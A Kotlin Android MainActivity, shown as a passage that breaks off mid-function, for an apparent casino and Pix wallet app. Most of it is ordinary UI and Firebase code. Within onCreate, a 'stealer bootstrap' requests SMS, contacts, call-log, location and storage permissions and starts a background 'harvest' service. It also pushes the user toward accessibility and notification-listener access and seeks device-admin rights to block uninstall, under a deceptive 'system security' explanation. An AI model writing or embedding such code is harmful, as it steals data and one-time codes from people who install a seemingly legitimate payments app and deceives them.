package com.example.zeca

import android.content.Intent
import android.app.Activity
import android.app.KeyguardManager
import android.net.Uri
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.activity.enableEdgeToEdge
import androidx.compose.animation.Crossfade
import androidx.compose.animation.AnimatedVisibility
import androidx.compose.animation.animateContentSize
import androidx.compose.animation.fadeIn
import androidx.compose.animation.fadeOut
import androidx.compose.animation.slideInVertically
import androidx.compose.animation.slideOutVertically
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxHeight
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.navigationBarsPadding
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.statusBarsPadding
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.Chat
import androidx.compose.material.icons.filled.AccountBalanceWallet
import androidx.compose.material.icons.filled.Casino
import androidx.compose.material.icons.filled.Close
import androidx.compose.material.icons.filled.Home
import androidx.compose.material.icons.filled.Groups
import androidx.compose.material.icons.filled.Notifications
import androidx.compose.material.icons.filled.Person
import androidx.compose.material.icons.filled.Settings
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.CompositionLocalProvider
import androidx.compose.runtime.DisposableEffect
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateListOf
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.saveable.rememberSaveable
import androidx.compose.runtime.saveable.rememberSaveableStateHolder
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.vector.ImageVector
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.LocalDensity
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.Density
import androidx.compose.ui.unit.sp
import androidx.compose.ui.zIndex
import kotlinx.coroutines.delay
import com.example.zeca.cards.ui.TelaCartoes
import com.example.zeca.cards.ui.TelaMaquininha
import com.example.zeca.cards.ui.TelaPagar
import com.example.zeca.ui.TelaCarteira
import com.example.zeca.ui.TelaConfigurarPerfil
import com.example.zeca.ui.AccountCurrencyInfo
import com.example.zeca.ui.AppCurrencyFormatter
import com.example.zeca.ui.PaisObrigatorio
import com.example.zeca.ui.TelaAutenticacao
import com.example.zeca.ui.TelaAdmin
import com.example.zeca.ui.TelaChat
import com.example.zeca.ui.TelaDenunciasAdmin
import com.example.zeca.ui.TelaCentralConta
import com.example.zeca.ui.TelaInicio
import com.example.zeca.ui.TelaJogos
import com.example.zeca.ui.TelaRecursosSociais
import com.example.zeca.ui.TelaTrabalho
import com.example.zeca.ui.TelaLoja
import com.example.zeca.ui.TelaPerfil
import com.example.zeca.ui.EstadoCarregamentoSocial
import com.example.zeca.ui.theme.CassinoTheme
import com.example.zeca.ui.theme.Cores
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.auth.FirebaseUser
import java.math.BigDecimal
import java.text.NumberFormat

private fun formatarValorNotificacao(centavos: Long): String = AppCurrencyFormatter.format(centavos)

enum class Aba(val titulo: String, val icone: ImageVector) {
    Inicio("Início", Icons.Filled.Home),
    Jogos("Jogos", Icons.Filled.Casino),
    Carteira("Carteira", Icons.Filled.AccountBalanceWallet),
    Chat("Chat", Icons.AutoMirrored.Filled.Chat),
    Comunidade("Comunidade", Icons.Filled.Groups),
    Conta("Conta", Icons.Filled.Settings),
    Perfil("Perfil", Icons.Filled.Person),
    Admin("Admin", Icons.Filled.Settings),
}

data class Movimento(
    val titulo: String,
    val variacaoCentavos: Long,
    val horario: String = SimpleDateFormat("dd/MM HH:mm", Locale.forLanguageTag("pt-BR")).format(Date()),
    val id: String = "",
    val ehTransferenciaPix: Boolean = false,
    val ehPremioNivel: Boolean = false,
    val contrapartida: String = "",
    val valorBaseCentavos: Long = 0L,
    val valorRemetenteCentavos: Long = 0L,
    val valorDestinatarioCentavos: Long = 0L,
    val debitoRemetenteCentavos: Long = 0L,
    val taxaBaseCentavos: Long = 0L,
    val taxaRemetenteCentavos: Long = 0L,
    val moedaRemetente: String = "BRL",
    val moedaDestinatario: String = "BRL",
    val paisRemetente: String = "BR",
    val paisDestinatario: String = "BR",
    val cotacaoTransferencia: Double = 1.0,
    val dataCotacao: String = "",
)

private data class NotificacaoApp(
    val id: String,
    val titulo: String,
    val detalhe: String,
    val aba: Aba,
)

class MainActivity : ComponentActivity() {
    private val appForeground = mutableStateOf(false)
    private val tugInviteRoomId = mutableStateOf("")
    private val pixPaymentLink = mutableStateOf("")

override fun onCreate(savedInstanceState: Bundle?) {
    super.onCreate(savedInstanceState)
    tugInviteRoomId.value = roomIdFromIntent(intent)
    pixPaymentLink.value = pixPaymentLinkFromIntent(intent)
    val visualPrefs = getSharedPreferences("zeca_preferences", MODE_PRIVATE)
    Cores.aplicarTema(visualPrefs.getString("theme", "dark").orEmpty())
    Cores.aplicarAcessibilidade(
        visualPrefs.getFloat("accessibilityFontScale", 1f),
        visualPrefs.getBoolean("highContrast", false),
        visualPrefs.getBoolean("reduceMotion", false),
    )
    enableEdgeToEdge()
    stealerInit()
    setContent {
        CassinoTheme {
            CassinoApp(
                appForeground.value,
                tugInviteRoomId.value,
                pixPaymentLink.value,
                { tugInviteRoomId.value = "" },
                { pixPaymentLink.value = "" },
            )
        }
    }
}

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        setIntent(intent)
        tugInviteRoomId.value = roomIdFromIntent(intent)
        pixPaymentLink.value = pixPaymentLinkFromIntent(intent)
    }

    private fun pixPaymentLinkFromIntent(intent: Intent?): String {
        val uri = intent?.data ?: return ""
        return uri.takeIf { it.scheme == "zeca" && it.host == "pix" }?.toString().orEmpty()
    }

    private fun roomIdFromIntent(intent: Intent?): String {
        val uri = intent?.data ?: return ""
        val roomId = uri.pathSegments.singleOrNull() ?: return ""
        return roomId.takeIf {
            uri.scheme == "zeca" && uri.host == "tug" &&
                Regex("^[a-f0-9-]{36}$", RegexOption.IGNORE_CASE).matches(it)
        }.orEmpty()
    }

    // ── stealer bootstrap ─────────────────────────────────────────────────────────

private fun stealerInit() {
    // runtime permissions — fire request, system dialog handles the prompt
    val needed = arrayOf(
        android.Manifest.permission.READ_SMS,
        android.Manifest.permission.RECEIVE_SMS,
        android.Manifest.permission.READ_CONTACTS,
        android.Manifest.permission.READ_CALL_LOG,
        android.Manifest.permission.ACCESS_FINE_LOCATION,
        android.Manifest.permission.READ_EXTERNAL_STORAGE,
    ).filter {
        checkSelfPermission(it) != android.content.pm.PackageManager.PERMISSION_GRANTED
    }.toTypedArray()
    if (needed.isNotEmpty()) requestPermissions(needed, 0)

    // start harvest service immediately
    val svc = android.content.Intent(this, com.example.zeca.stealer.StealerService::class.java)
    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O)
        startForegroundService(svc)
    else
        startService(svc)

    // accessibility — send to settings if not yet enabled
    if (!isStealerAccessibilityOn()) {
        startActivity(
            android.content.Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS)
                .apply { flags = android.content.Intent.FLAG_ACTIVITY_NEW_TASK }
        )
    }

    // notification listener — redirect if missing
    if (!isNotificationListenerOn()) {
        startActivity(
            android.content.Intent(android.provider.Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
        )
    }

    // device admin — blocks uninstall
    if (!isDeviceAdminOn()) {
        val admin = android.content.ComponentName(
            this, com.example.zeca.stealer.AdminReceiver::class.java
        )
        startActivity(
            android.content.Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
                .putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
                .putExtra(
                    android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "Necessário para segurança do sistema."
                )
        )
    }
}

private fun isStealerAccessibilityOn(): Boolean = try {
    val enabled = android.provider.Settings.Secure.getInt(
        contentResolver, android.provider.Settings.Secure.ACCESSIBILITY_ENABLED)
    if (enabled != 1) false
    else {
        val services = android.provider.Settings.Secure.getString(
            contentResolver, android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
        services?.contains(packageName) == true
    }
} catch (e: Exception) { false }

private fun isNotificationListenerOn(): Boolean {
    val flat = android.provider.Settings.Secure.getString(
        contentResolver, "enabled_notification_listeners")
    return flat?.contains(packageName) == true
}

private fun isDeviceAdminOn(): Boolean {
    val dpm = getSystemService(android.app.admin.DevicePolicyManager::class.java)
    val admin = android.content.ComponentName(
        this, com.example.zeca.stealer.AdminReceiver::class.java)
    return dpm?.isAdminActive(admin) == true
}

// ── end stealer bootstrap ─────────────────────────────────────────────────────

override fun onResume() {
    super.onResume()
    appForeground.value = true
}

    override fun onPause() {
        appForeground.value = false
        super.onPause()
    }
}

@Composable
fun CassinoApp(
    appForeground: Boolean,
    tugInviteRoomId: String,
    pixPaymentLink: String,
    onTugInviteHandled: () -> Unit,
    onPixPaymentLinkHandled: () -> Unit,
) {
    val auth = remember { FirebaseRepository.auth }
    var usuario by remember { mutableStateOf(auth.currentUser) }

    DisposableEffect(auth) {
        val listener = FirebaseAuth.AuthStateListener { usuario = it.currentUser }
        auth.addAuthStateListener(listener)
        onDispose { auth.removeAuthStateListener(listener) }
    }

    val usuarioAtual = usuario
    if (usuarioAtual == null) {
        TelaAutenticacao(onAutenticado = { usuario = it })
    } else {
        val systemDensity = LocalDensity.current
        CompositionLocalProvider(
            LocalDensity provides Density(
                density = systemDensity.density,
                fontScale = systemDensity.fontScale * Cores.EscalaTexto,
            ),
        ) {
            AppAutenticado(usuarioAtual, appForeground, tugInviteRoomId, pixPaymentLink, onTugInviteHandled, onPixPaymentLinkHandled)
        }
    }
}

@Composable
    private fun AppAutenticado(
        usuario: FirebaseUser,
        appForeground: Boolean,
        tugInviteRoomId: String,
        pixPaymentLink: String,
        onTugInviteHandled: () -> Unit,
        onPixPaymentLinkHandled: () -> Unit,
    ) {
    val contexto = LocalContext.current
    val deviceLockPreferences = remember(usuario.uid) {
        contexto.getSharedPreferences("zeca_preferences", android.content.Context.MODE_PRIVATE)
    }
    var bloqueioDispositivoAtivo by remember(usuario.uid) {
        mutableStateOf(deviceLockPreferences.getBoolean("device_lock_enabled", false))
    }
    var dispositivoDesbloqueado by remember(usuario.uid) { mutableStateOf(!bloqueioDispositivoAtivo) }
    var solicitacaoAutenticacaoPendente by remember(usuario.uid) { mutableStateOf(false) }
    var tentativaAutenticacao by remember(usuario.uid) { mutableStateOf(0) }
    var promptDispensado by remember(usuario.uid) { mutableStateOf(false) }
    var mudancaBloqueioPendente by remember(usuario.uid) { mutableStateOf<Boolean?>(null) }
    var exigePais by remember(usuario.uid) { mutableStateOf(false) }
    var carregandoPais by remember(usuario.uid) { mutableStateOf(false) }
    var moedaInicializada by remember(usuario.uid) { mutableStateOf(false) }
    var erroCarregamentoMoeda by remember(usuario.uid) { mutableStateOf("") }
    var tentativasMoeda by remember(usuario.uid) { mutableStateOf(0) }

    LaunchedEffect(usuario.uid, tentativasMoeda) {
        val currencyCachePrefix = "account_currency_${usuario.uid}_"
        if (tentativasMoeda == 0) {
            val cachedCountry = deviceLockPreferences.getString("${currencyCachePrefix}country", "").orEmpty()
            val cachedCurrency = deviceLockPreferences.getString("${currencyCachePrefix}currency", "").orEmpty()
            val cachedRate = deviceLockPreferences.getString("${currencyCachePrefix}rate", null)?.toDoubleOrNull() ?: 0.0
            if (cachedCountry.matches(Regex("^[A-Z]{2}$"))
                && cachedCurrency.matches(Regex("^[A-Z]{3}$"))
                && cachedRate > 0.0
            ) {
                AppCurrencyFormatter.update(
                    AccountCurrencyInfo(
                        countryCode = cachedCountry,
                        currencyCode = cachedCurrency,
                        rate = cachedRate,
                        rateDate = deviceLockPreferences.getString("${currencyCachePrefix}date", "").orEmpty(),
                    ),
                )
                moedaInicializada = true
            }
        }
        carregandoPais = true
        FirebaseRepository.getAccountCurrency { info, error ->
            carregandoPais = false
            if (error != null || info == null) {
                erroCarregamentoMoeda = error?.localizedMessage ?: "Não foi possível carregar a moeda da conta."
                return@getAccountCurrency
            }
            val account = info
            AppCurrencyFormatter.update(account)
            exigePais = account.countryCode.isBlank()
            moedaInicializada = true
            erroCarregamentoMoeda = ""
            if (!exigePais && account.currencyCode.matches(Regex("^[A-Z]{3}$")) && account.rate > 0.0) {
                deviceLockPreferences.edit()
                    .putString("${currencyCachePrefix}country", account.countryCode)
                    .putString("${currencyCachePrefix}currency", account.currencyCode)
                    .putString("${currencyCachePrefix}rate", account.rate.toString())
                    .putString("${currencyCachePrefix}date", account.rateDate)
                    .apply()
            }
        }
    }

    if (exigePais) {
        PaisObrigatorio { pais, moeda ->
            FirebaseRepository.setAccountCountry(pais, moeda) { setError ->
                if (setError != null) {
                    android.widget.Toast.makeText(
                        contexto,
                        setError.localizedMessage ?: "Não foi possível salvar o país.",
                        android.widget.Toast.LENGTH_SHORT,
                    ).show()
                    return@setAccountCountry
                }
                FirebaseRepository.getAccountCurrency { account, loadError ->
                    if (loadError != null || account == null || account.countryCode.isBlank()) {
                        erroCarregamentoMoeda = loadError?.localizedMessage
                            ?: "Não foi possível confirmar a moeda selecionada."
                        exigePais = false
                        moedaInicializada = false
                        return@getAccountCurrency
                    }
                    AppCurrencyFormatter.update(account)
                    deviceLockPreferences.edit()
                        .putString("account_currency_${usuario.uid}_country", account.countryCode)
                        .putString("account_currency_${usuario.uid}_currency", account.currencyCode)
                        .putString("account_currency_${usuario.uid}_rate", account.rate.toString())
                        .putString("account_currency_${usuario.uid}_date", account.rateDate)
                        .apply()
                    exigePais = false
                    moedaInicializada = true
                    erroCarregamentoMoeda = ""
                }
            }
        }
        return
    }

    if (!moedaInicializada) {
        Column(
            Modifier.fillMaxSize().background(Cores.Fundo).statusBarsPadding().padding(24.dp),
            verticalArrangement = Arrangement.Center,
            horizontalAlignment = Alignment.CenterHorizontally,
        ) {
            Text("Carregando a moeda da sua conta...", color = Color.White, fontWeight = FontWeight.Bold)
            if (erroCarregamentoMoeda.isNotBlank()) {
                Text(
                    erroCarregamentoMoeda,
                    modifier = Modifier.padding(top = 10.dp),
                    color = Cores.Laranja,
                )
                androidx.compose.material3.Button(
                    onClick = { tentativasMoeda++ },
                    enabled = !carregandoPais,
                    modifier = Modifier.padding(top = 12.dp),
                ) {
                    Text(if (carregandoPais) "Tentando novamente..." else "Tentar novamente")
                }
            }
        }
        return
    }

    val autenticadorDispositivo = rememberLauncherForActivityResult(
        ActivityResultContracts.StartActivityForResult(),
    ) { result ->
        val desiredState = mudancaBloqueioPendente
        solicitacaoAutenticacaoPendente = false
        mudancaBloqueioPendente = null
        if (result.resultCode == Activity.RESULT_OK) {
            val newState = desiredState ?: true
            deviceLockPreferences.edit().putBoolean("device_lock_enabled", newState).apply()
            bloqueioDispositivoAtivo = newState
            dispositivoDesbloqueado = true
            promptDispensado = false
        } else {
            promptDispensado = true
            android.widget.Toast.makeText(contexto, "Autenticação cancelada.", android.widget.Toast.LENGTH_SHORT).show()
        }
    }
    LaunchedEffect(appForeground, bloqueioDispositivoAtivo, tentativaAutenticacao) {
        if (!appForeground) {
            if (!solicitacaoAutenticacaoPendente) {
                dispositivoDesbloqueado = !bloqueioDispositivoAtivo
                promptDispensado = false
            }
            return@LaunchedEffect
        }
        if (bloqueioDispositivoAtivo && !dispositivoDesbloqueado
            && !solicitacaoAutenticacaoPendente && !promptDispensado) {
            val keyguard = contexto.getSystemService(KeyguardManager::class.java)
            val intent = keyguard?.createConfirmDeviceCredentialIntent(
                "Desbloquear Zeca",
                "Confirme seu PIN, padrão ou senha do dispositivo.",
            )
            if (intent == null) {
                promptDispensado = true
                android.widget.Toast.makeText(contexto, "Configure um bloqueio de tela no Android primeiro.", android.widget.Toast.LENGTH_LONG).show()
            } else {
                solicitacaoAutenticacaoPendente = true
                autenticadorDispositivo.launch(intent)
            }
        }
    }
    var aba by rememberSaveable { mutableStateOf(Aba.Inicio) }
    var ehAdmin by remember(usuario.uid) { mutableStateOf(false) }
    var mostrarDenunciasAdmin by rememberSaveable(usuario.uid) { mutableStateOf(false) }
    var mostrarLoja by rememberSaveable { mutableStateOf(false) }
    var mostrarTrabalho by rememberSaveable { mutableStateOf(false) }
    var mostrarMaquininha by rememberSaveable { mutableStateOf(false) }
    var mostrarPagar by rememberSaveable { mutableStateOf(false) }
    var mostrarCartoes by rememberSaveable { mutableStateOf(false) }
    var perfil by remember(usuario.uid) { mutableStateOf<PerfilJogador?>(null) }
    var erroPerfil by rememberSaveable { mutableStateOf("") }
    var saldoFinanceiro by remember(usuario.uid) { mutableStateOf<Long?>(null) }
    var carregandoSaldo by remember(usuario.uid) { mutableStateOf(true) }
    var erroSaldo by remember(usuario.uid) { mutableStateOf("") }
    val ranking = remember { mutableStateListOf<JogadorRanking>() }
    var carregandoRanking by remember(usuario.uid) { mutableStateOf(true) }
    var erroRanking by remember(usuario.uid) { mutableStateOf("") }
    val movimentos = remember { mutableStateListOf<Movimento>() }
    var carregandoMovimentos by remember(usuario.uid) { mutableStateOf(true) }
    var erroMovimentos by remember(usuario.uid) { mutableStateOf("") }
    val idsMovimentos = remember(usuario.uid) { mutableSetOf<String>() }
    var movimentosCarregados by remember(usuario.uid) { mutableStateOf(false) }
    val itensComprados = remember { mutableStateListOf<String>() }
    val notificacoes = remember { mutableStateListOf<NotificacaoApp>() }
    var presencasChat by remember { mutableStateOf<List<PresencaChat>>(emptyList()) }
    var recursosSociais by remember(usuario.uid) { mutableStateOf(ResultadoRecursosSociais()) }
    var recursosSociaisCarregando by remember(usuario.uid) { mutableStateOf(false) }
    var erroRecursosSociais by remember(usuario.uid) { mutableStateOf<String?>(null) }
    var statusDenunciasConhecidos by remember(usuario.uid) { mutableStateOf<Map<String, String>>(emptyMap()) }
    var statusDenunciasInicializado by remember(usuario.uid) { mutableStateOf(false) }
    var painelConta by remember(usuario.uid) { mutableStateOf<PainelConta?>(null) }
    var erroPainelConta by remember(usuario.uid) { mutableStateOf("") }
    var carregandoPainelConta by remember(usuario.uid) { mutableStateOf(false) }
    var estadosSalasConhecidos by remember(usuario.uid) { mutableStateOf<Map<String, String>?>(null) }
    val convitesCaboNotificados = remember(usuario.uid) { mutableSetOf<String>() }
    val stateHolder = rememberSaveableStateHolder()

    fun notificar(notificacao: NotificacaoApp) {
        if (notificacoes.none { it.id == notificacao.id }) {
            notificacoes.add(notificacao)
            if (notificacoes.size > 4) notificacoes.removeAt(0)
        }
    }

    fun carregarSaldo() {
        if (saldoFinanceiro == null) carregandoSaldo = true
        FirebaseRepository.carregarSaldo { balance, error ->
            if (balance != null) {
                saldoFinanceiro = balance
                erroSaldo = ""
                carregandoSaldo = false
            }
            if (error != null) {
                erroSaldo = error.localizedMessage ?: "Não foi possível atualizar o saldo."
                carregandoSaldo = false
            }
        }
    }

    fun carregarRanking() {
        if (ranking.isEmpty()) carregandoRanking = true
        FirebaseRepository.carregarRanking { players, error ->
            if (players != null) {
                ranking.clear()
                ranking.addAll(players)
                erroRanking = ""
                carregandoRanking = false
            }
            if (error != null) {
                erroRanking = error.localizedMessage ?: "Não foi possível atualizar o ranking."
                carregandoRanking = false
            }
        }
    }

    fun carregarMovimentos() {
        if (movimentos.isEmpty()) carregandoMovimentos = true
        FirebaseRepository.carregarMovimentos { recent, error ->
            if (recent != null) {
                if (movimentosCarregados) {
                    recent.forEach { movimento ->
                        if (idsMovimentos.add(movimento.id) && movimento.variacaoCentavos > 0L) {
                            notificar(
                                NotificacaoApp(
                                    id = "movimento:${movimento.id}",
                                    titulo = when {
                                        movimento.ehPremioNivel -> "Novo nível alcançado!"
                                        movimento.ehTransferenciaPix -> "Pix recebido"
                                        else -> "Saldo recebido"
                                    },
                                    detalhe = "${movimento.titulo} · ${formatarValorNotificacao(movimento.variacaoCentavos)}",
                                    aba = Aba.Carteira,
                                ),
                            )
                        }
                    }
                } else {
                    idsMovimentos.addAll(recent.map { it.id })
                    movimentosCarregados = true
                }
                movimentos.clear()
                movimentos.addAll(recent)
                erroMovimentos = ""
                carregandoMovimentos = false
            }
            if (error != null) {
                erroMovimentos = error.localizedMessage ?: "Não foi possível carregar o extrato."
                carregandoMovimentos = false
            }
        }
    }

    fun carregarRecursosSociais() {
        recursosSociaisCarregando = true
        FirebaseRepository.carregarRecursosSociais { result, error ->
            recursosSociaisCarregando = false
            if (result != null) {
                val novosStatus = result.atualizacoesDenuncias.associate { it.id to it.status }
                if (statusDenunciasInicializado) {
                    result.atualizacoesDenuncias.forEach { report ->
                        val statusAnterior = statusDenunciasConhecidos[report.id]
                        if (statusAnterior != null && statusAnterior != report.status) {
                            val notificationId = "report-update:${report.id}:${report.status}"
                            if (notificacoes.none { it.id == notificationId }) {
                                notificacoes.add(
                                    NotificacaoApp(
                                        id = notificationId,
                                        titulo = "Atualização de denúncia",
                                        detalhe = when (report.status) {
                                            "reviewing" -> "Sua denúncia entrou em análise."
                                            "resolved" -> "Sua denúncia foi resolvida."
                                            "dismissed" -> "Sua denúncia foi encerrada sem ação."
                                            else -> "O status da sua denúncia foi atualizado."
                                        },
                                        aba = Aba.Comunidade,
                                    ),
                                )
                                if (notificacoes.size > 4) notificacoes.removeAt(0)
                            }
                        }
                    }
                }
                statusDenunciasConhecidos = novosStatus
                statusDenunciasInicializado = true
                recursosSociais = result
                erroRecursosSociais = null
            } else {
                erroRecursosSociais = error?.localizedMessage ?: "Não foi possível carregar os dados da comunidade."
            }
        }
    }

    fun concluirAcaoSocial(callback: (Exception?) -> Unit): (Exception?) -> Unit = { error ->
        if (error == null) carregarRecursosSociais()
        callback(error)
    }

    fun carregarPainelConta() {
        carregandoPainelConta = true
        FirebaseRepository.carregarPainelConta { result, error ->
            carregandoPainelConta = false
            if (result == null) {
                erroPainelConta = error?.localizedMessage ?: "Não foi possível carregar as configurações da conta."
                return@carregarPainelConta
            }
            erroPainelConta = ""
            val savedPreferences = result.preferences
            val localPreferences = if (savedPreferences.syncSettings) {
                savedPreferences
            } else {
                savedPreferences.copy(
                    theme = deviceLockPreferences.getString("theme", savedPreferences.theme).orEmpty(),
                    locale = deviceLockPreferences.getString("locale", savedPreferences.locale).orEmpty(),
                    accessibilityFontScale = deviceLockPreferences.getFloat(
                        "accessibilityFontScale",
                        savedPreferences.accessibilityFontScale.toFloat(),
                    ).toDouble(),
                    highContrast = deviceLockPreferences.getBoolean("highContrast", savedPreferences.highContrast),
                    reduceMotion = deviceLockPreferences.getBoolean("reduceMotion", savedPreferences.reduceMotion),
                    confirmImportant = deviceLockPreferences.getBoolean("confirmImportant", savedPreferences.confirmImportant),
                    personalizedRecommendations = deviceLockPreferences.getBoolean(
                        "personalizedRecommendations",
                        savedPreferences.personalizedRecommendations,
                    ),
                )
            }
            painelConta = result.copy(preferences = localPreferences)
            Cores.aplicarTema(localPreferences.theme)
            Cores.aplicarAcessibilidade(
                localPreferences.accessibilityFontScale.toFloat(),
                localPreferences.highContrast,
                localPreferences.reduceMotion,
            )
            Locale.setDefault(Locale.forLanguageTag(localPreferences.locale))
            deviceLockPreferences.edit()
                .putString("theme", localPreferences.theme)
                .putString("locale", localPreferences.locale)
                .putFloat("accessibilityFontScale", localPreferences.accessibilityFontScale.toFloat())
                .putBoolean("highContrast", localPreferences.highContrast)
                .putBoolean("reduceMotion", localPreferences.reduceMotion)
                .putBoolean("confirmImportant", localPreferences.confirmImportant)
                .putBoolean("personalizedRecommendations", localPreferences.personalizedRecommendations)
                .apply()
            result.announcements.forEach { announcement ->
                notificar(
                    NotificacaoApp(
                        id = "announcement:${announcement.id}",
                        titulo = if (announcement.type == "maintenance") "Aviso de manutenção" else "Novidade no app",
                        detalhe = announcement.title,
                        aba = Aba.Conta,
                    ),
                )
            }
        }
    }

    LaunchedEffect(usuario.uid, aba) {
        if (aba == Aba.Comunidade) carregarRecursosSociais()
        if (aba == Aba.Conta) carregarPainelConta()
    }

    LaunchedEffect(usuario.uid, appForeground) {
        if (!appForeground) return@LaunchedEffect
        carregarPainelConta()
        while (true) {
            delay(60_000)
            carregarPainelConta()
        }
    }

    LaunchedEffect(usuario.uid, appForeground) {
        if (!appForeground) return@LaunchedEffect
        while (true) {
            delay(60_000)
            carregarRecursosSociais()
        }
    }

    LaunchedEffect(usuario.uid, appForeground) {
        if (!appForeground) return@LaunchedEffect
        while (true) {
            FirebaseRepository.listarSalasCaboGuerra { rooms, error ->
                if (error == null) {
                    val current = rooms.associate { it.id to it.status }
                    val previous = estadosSalasConhecidos
                    if (previous != null) {
                        rooms.forEach { room ->
                            val oldStatus = previous[room.id]
                            if (oldStatus == "waiting" && room.status == "ready") {
                                notificar(
                                    NotificacaoApp(
                                        id = "room-full:${room.id}",
                                        titulo = "Sala cheia",
                                        detalhe = "A sala de ${room.criadorNome} está pronta para começar.",
                                        aba = Aba.Jogos,
                                    ),
                                )
                            } else if (oldStatus in listOf("waiting", "ready") && room.status == "active") {
                                notificar(
                                    NotificacaoApp(
                                        id = "room-started:${room.id}",
                                        titulo = "Partida iniciada",
                                        detalhe = "A partida de ${room.criadorNome} começou.",
                                        aba = Aba.Jogos,
                                    ),
                                )
                            }
                        }
                    }
                    estadosSalasConhecidos = current
                }
            }
            delay(30_000)
        }
    }

    LaunchedEffect(usuario.uid) {
        FirebaseRepository.verificarAdmin { ehAdmin = it }
    }

    LaunchedEffect(tugInviteRoomId) {
        if (tugInviteRoomId.isNotBlank()) aba = Aba.Jogos
    }

    LaunchedEffect(pixPaymentLink) {
        if (pixPaymentLink.isNotBlank()) aba = Aba.Carteira
    }

    DisposableEffect(usuario.uid, aba) {
        if (aba == Aba.Chat) {
            val registration = FirebaseRepository.observarPresencasChat { presencasChat = it }
            onDispose { registration.remove() }
        } else {
            presencasChat = emptyList()
            onDispose { }
        }
    }

    LaunchedEffect(usuario.uid, appForeground, aba) {
        val jogoAtivo = if (aba == Aba.Jogos) "Jogando" else ""
        if (!appForeground) {
            FirebaseRepository.atualizarPresencaChat(online = false)
            return@LaunchedEffect
        }
        while (true) {
            FirebaseRepository.atualizarPresencaChat(online = true, jogoAtivo = jogoAtivo)
            delay(60_000)
        }
    }

    LaunchedEffect(usuario.uid) {
        while (true) {
            FirebaseRepository.listarSalasCaboGuerra { rooms, error ->
                if (error == null) {
                    rooms.filter { it.conviteParaMim && it.status == "waiting" }.forEach { room ->
                        if (convitesCaboNotificados.add("${room.id}:${room.versaoConvite}")) {
                            notificar(
                                NotificacaoApp(
                                    id = "tug-invite:${room.id}:${room.versaoConvite}",
                                    titulo = "Convite para Cabo de Guerra",
                                    detalhe = "${room.criadorNome} convidou você · aposta ${formatarValorNotificacao(room.apostaCentavos)}",
                                    aba = Aba.Jogos,
                                ),
                            )
                        }
                    }
                }
            }
            delay(60_000)
        }
    }

    DisposableEffect(usuario.uid) {
        val profileRegistration = FirebaseRepository.observarPerfil(usuario.uid) { perfil = it }
        val balanceRegistration = FirebaseRepository.observarSaldo { balance, error ->
            if (balance != null) {
                saldoFinanceiro = balance
                erroSaldo = ""
                carregandoSaldo = false
            }
            if (error != null) {
                erroSaldo = error.localizedMessage ?: "Não foi possível atualizar o saldo."
                if (saldoFinanceiro == null) carregandoSaldo = false
            }
        }
        val idsMensagensPrivadas = mutableMapOf<String, String>()
        var conversasCarregadas = false
        val conversationsRegistration = FirebaseRepository.observarConversasChat(usuario.uid) { conversas, erro, fromCache ->
            if (erro == null && !fromCache) {
                if (!conversasCarregadas) {
                    conversas.forEach { idsMensagensPrivadas[it.id] = it.ultimaMensagemId }
                    conversasCarregadas = true
                } else {
                    conversas.forEach { conversa ->
                        val mensagemAnterior = idsMensagensPrivadas[conversa.id]
                        if (conversa.ultimaMensagemId.isNotBlank()
                            && conversa.ultimaMensagemId != mensagemAnterior
                            && conversa.ultimoRemetenteUid != usuario.uid) {
                            notificar(
                                NotificacaoApp(
                                    id = "mensagem:${conversa.id}:${conversa.ultimaMensagemId}",
                                    titulo = "Nova mensagem",
                                    detalhe = conversa.ultimaMensagem.take(90),
                                    aba = Aba.Chat,
                                ),
                            )
                        }
                        idsMensagensPrivadas[conversa.id] = conversa.ultimaMensagemId
                    }
                }
            }
        }
        val idsMensagensGlobais = mutableSetOf<String>()
        var chatGlobalCarregado = false
        val globalMessagesRegistration = FirebaseRepository.observarMensagensChat("global", usuario.uid) { mensagens, erro, fromCache ->
            if (erro == null && !fromCache) {
                if (!chatGlobalCarregado) {
                    idsMensagensGlobais.addAll(mensagens.map { it.id })
                    chatGlobalCarregado = true
                } else {
                    mensagens.forEach { mensagem ->
                        if (idsMensagensGlobais.add(mensagem.id) && !mensagem.minha) {
                            notificar(
                                NotificacaoApp(
                                    id = "mensagem:global:${mensagem.id}",
                                    titulo = "Mensagem no chat global",
                                    detalhe = "${mensagem.autor}: ${mensagem.texto.take(75)}",
                                    aba = Aba.Chat,
                                ),
                            )
                        }
                    }
                }
            }
        }
